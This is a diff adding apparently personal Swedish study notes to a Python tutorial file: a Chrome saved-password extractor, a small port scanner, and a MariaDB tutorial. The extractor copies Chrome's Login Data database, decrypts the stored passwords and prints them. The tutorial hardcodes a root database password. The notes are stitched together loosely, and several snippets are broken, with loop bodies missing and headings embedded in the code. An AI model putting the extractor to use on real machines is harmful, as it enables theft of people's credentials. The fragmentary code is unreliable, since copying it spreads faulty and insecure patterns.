@@ -452,3 +452,309 @@ def print_stuff():
 print_stuff() # we call print_stuff and the program execution goes to (***)
 print(y) # works fine
 print (z) # NameError!!!
+
+SQL anteckningar.___________________________________________________________________________________________________________
+import os
+import sqlite3
+import win32crypt
+
+from shutil import copyfile
+
+path = os.getenv("LOCALAPPDATA") + "\Google\Chrome\\User Data\Default\Login Data"
+path2 = os.getenv("LOCALAPPDATA") + "\Google\Chrome\\User Data\Default\Login2"
+copyfile(path,path2)
+
+conn = sqlite3.connect(path2)
+
+c = conn.cursor()
+
+c.execute('SELECT action_url, username_value, password_value FROM logins')
+
+for bla in c.fetchall():
+    print ((bla[0] + '\n' + bla[1]))
+
+    password = win32crypt.CryptUnprotectData(bla[2])[1]
+    print(password)
+    f = open("myPythonpasswords.txt", "w")
+conn.close()
+      
+PORTSCANNER
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+target = input("skriv ditt ip att scanna:")
+
+
+def portscan(port):
+        try:
+            connect= s.connect((target,port))
+            return True
+        except:
+            return False
+
+
+for ports in range(1,100):
+    if portscan(ports):
+        print('Port',ports, "Är öppen")
+
+     
+  MARIADB_________________________________________________________________________
+  #!usr/bin/python3 #Databas
+
+import mysql.connector as mariadb
+
+mariadb_connection = mariadb.connect(
+    user='root',
+    password='xenter19',
+    database='test')
+    
+        
+cursor = mariadb_connection.cursor()
+cursor.execute("USE test")
+cursor.execute("SHOW TABLES")
+result = cursor.fetchall()
+print(result)
+
+for x in result:
+    print(x)
+      
+ & Tables
+import mysql.connector
+import mysql.connector as mariadb
+
+
+mariadb = mysql.connector.connect(
+  user="root",
+  passwd="xenter19",
+  database="test"
+)
+
+cursor = mariadb.cursor()
+
+cursor.execute("CREATE TABLE customers (id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(255), address VARCHAR(255))")
+      
+& insert
+import mysql.connector
+
+mydb = mysql.connector.connect(
+  user="root",
+  passwd="xenter19",
+  database="test"
+)
+
+mycursor = mydb.cursor()
+
+sql = "INSERT INTO customers (name, address) VALUES (%s, %s)"
+val = ("John", "Highway 21")
+mycursor.execute(sql, val)
+
+mydb.commit()
+
+print(mycursor.rowcount, "record inserted.")
+
+& insert multi tables 
+ import mysql.connector
+
+mydb = mysql.connector.connect(
+  user="root",
+  passwd="xenter19",
+  database="test"
+)
+
+
+mycursor = mydb.cursor()
+
+sql = "INSERT INTO customers (name, address) VALUES (%s, %s)"
+val = [
+  ('Peter', 'Lowstreet 4'),
+  ('Amy', 'Apple st 652'),
+  ('Hannah', 'Mountain 21'),
+  ('Michael', 'Valley 345'),
+  ('Sandy', 'Ocean blvd 2'),
+  ('Betty', 'Green Grass 1'),
+  ('Richard', 'Sky st 331'),
+  ('Susan', 'One way 98'),
+  ('Vicky', 'Yellow Garden 2'),
+  ('Ben', 'Park Lane 38'),
+  ('William', 'Central st 954'),
+  ('Chuck', 'Main Road 989'),
+  ('Viola', 'Sideway 1633')
+]
+
+mycursor.executemany(sql, val)
+
+mydb.commit()
+
+      
+Insert ID
+import mysql.connector
+
+mydb = mysql.connector.connect(
+  user="root",
+  passwd="xenter19",
+  database="test"
+)
+
+mycursor = mydb.cursor()
+
+sql = "INSERT INTO customers (name, address) VALUES (%s, %s)"
+val = ("Michelle", "Blue Village")
+mycursor.execute(sql, val)
+
+mydb.commit()
+
+print("1 record inserted, ID:", mycursor.lastrowid)
+
+& SELECT STATMENT
+import mysql.connector
+
+mydb = mysql.connector.connect(
+  user="root",
+  passwd="xenter19",
+  database="test"
+)
+
+
+mycursor = mydb.cursor()
+
+mycursor.execute("SELECT name, address FROM customers")
+
+myresult = mycursor.fetchall()
+
+
+for x in myresult:
+ & fetch one object 
+      
+  import mysql.connector
+
+mydb = mysql.connector.connect(
+  user="root",
+  passwd="xenter19",
+  database="test"
+)
+
+mycursor = mydb.cursor()
+
+mycursor.execute("SELECT * FROM customers")
+
+myresult = mycursor.fetchone()
+
+print(myresult)
+      
+ & filter by
+ mycursor = mydb.cursor()
+
+sql = "SELECT * FROM customers WHERE address ='Park Lane 38'"
+
+mycursor.execute(sql)
+
+myresult = mycursor.fetchall()
+
+for x in myresult:
+  print(x)
+&Wildcard 
+mycursor = mydb.cursor()
+
+sql = "SELECT * FROM customers WHERE address LIKE '%way%'"
+
+mycursor.execute(sql)
+
+myresult = mycursor.fetchall()
+
+for x in myresult:
+  print(x)
+  
+  #Detta gör att allt med "Way" kommer fram i CMD skriptet.
+      
+ & prevent sql injection 
+
+sql = "SELECT * FROM customers WHERE address = %s"
+adr = ("Yellow Garden 2", )
+
+mycursor.execute(sql, adr)
+
+myresult = mycursor.fetchall()
+
+for x in myresult:
+  print(x)
+
+#When query values are provided by the user, you should escape the values.
+
+#This is to prevent SQL injections, which is a common web hacking technique to destroy or misuse your database.
+
+#The mysql.connector module has methods to escape query values:
+
+#Escape query values by using the placholder %s method:
+      
+print(mycursor.rowcount, "was inserted.")
+      
+ &Delete statment 
+      sql = "DELETE FROM customers WHERE address = 'Mountain 21'"
+
+mycursor.execute(sql)
+
+mydb.commit()
+
+print(mycursor.rowcount, "record(s) deleted")
+
+#Om jag vill ta bort något annat byter jag bara ut 'mountain 21 
+#Important!: Notice the statement: mydb.commit(). It is required to make the changes, otherwise no changes are made to the table.
+
+#Notice the WHERE clause in the DELETE syntax: The WHERE clause specifies which record(s) that should be deleted. 
+#If you omit the WHERE clause, all records will be deleted!
+
+#It is considered a good practice to escape the values of any query, also in delete statements.
+
+#This is to prevent SQL injections, which is a common web hacking technique to destroy or misuse your database.
+
+#The mysql.connector module uses the placeholder %s to escape values in the delete statement:  
+      
+ & Drop tables 
+mycursor = mydb.cursor()
+#sql = "DROP TABLE customers"
+sql = "DROP TABLE IF EXISTS customers"
+
+mycursor.execute(sql)
+
+#You can delete an existing table by using the "DROP TABLE" statement:
+#If the the table you want to delete is already deleted, or for any other reason does not exist, 
+#you can use the IF EXISTS keyword to avoid getting an error.
+      
+ &Update table 
+mycursor = mydb.cursor()
+
+sql = "UPDATE customers SET address = 'Canyon 123' WHERE address = 'Valley 345'"
+
+mycursor.execute(sql)
+
+mydb.commit()
+
+print(mycursor.rowcount, "record(s) affected")
+
+#mysql.connector.errors.ProgrammingError: 1146 (42S02): Table 'test.customers' doesn't exist 
+#Detta meddelandet kommer då vi tog bort denna i förra avsnittet.
+      
+&Limit the results 
+mycursor.execute("SELECT * FROM customers LIMIT 5")
+#mycursor.execute("SELECT * FROM customers LIMIT 5 OFFSET 2")
+myresult = mycursor.fetchall()
+
+for x in myresult:
+  print(x)	
+  
+#You can limit the number of records returned from the query, by using the "LIMIT" statement:
+#Om du vill returnera fem poster från och med den tredje posten kan du använda nyckelordet "OFFSET":
+ 
+ &
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+ 
